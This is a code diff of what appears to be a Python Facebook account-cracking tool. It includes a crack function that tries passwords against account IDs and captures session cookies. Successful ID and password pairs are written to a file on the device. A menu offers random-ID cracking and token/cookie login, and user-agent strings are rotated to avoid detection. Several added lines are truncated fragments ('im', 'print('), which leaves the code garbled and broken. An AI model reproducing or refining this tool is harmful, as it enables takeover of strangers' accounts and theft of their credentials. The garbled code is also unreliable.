@@ -20,7 +20,7 @@ except ImportError:
 	os.system("pip install futures")
 
 import os
-import sys
+im
 import time
 import requests
 import random
@@ -333,7 +333,7 @@ def crack(idf,pwv):
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [ FAISAL-OK ] {idf} | {pw}')
+				print(
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
 				open('/sdcard/ids/ok.txt','a').write('%s\n' % wrt)
@@ -429,7 +429,7 @@ class Main:
 		print("╭──────────────────────────────────────────────────────────────╮")
 		print("│ [1] CRACK FILE CLONING (\x1b[1;96mFREE\x1b[1;97m)                                │")
 		print("│ [2] LOGIN TOKEN & COOKIES (\x1b[1;96mFREE\x1b[1;97m)                             │")
-		print("│ [3] DUMP/MAKE FILE ID (\x1b[1;91mEROR\x1b[1;97m)                                 │")
+		print("│ [3] DUMP/MAKE                                  │")
 		print("│ [4] CRACK RANDOM FB ID 2008-9 (\x1b[1;96mFREE\x1b[1;97m)                         │")
 		print("│ [5] CRACK RANDOM FB ID 2011-14 (\x1b[1;96mFREE\x1b[1;97m)                        │")
 		print("│ [6] CRACK RANDOM FB ID 2004-2005 (\x1b[1;96mEREE\x1b[1;97m)                      │")
@@ -491,7 +491,7 @@ class Main:
   "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:40.0) Gecko/20100101 Firefox/40.0.2 Waterfox/40.0.2",
   "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
   "Mozilla/5.0 (Linux; Android 4.4.2; SM-T217S Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
-  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MALNJS; rv:11.0) like Gecko",
+o",
   "Mozilla/5.0 (Linux; Android 4.4.2; RCT6203W46 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
   "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
   "Mozilla/5.0 (Android; Tablet; rv:34.0) Gecko/34.0 Firefox/34.0",
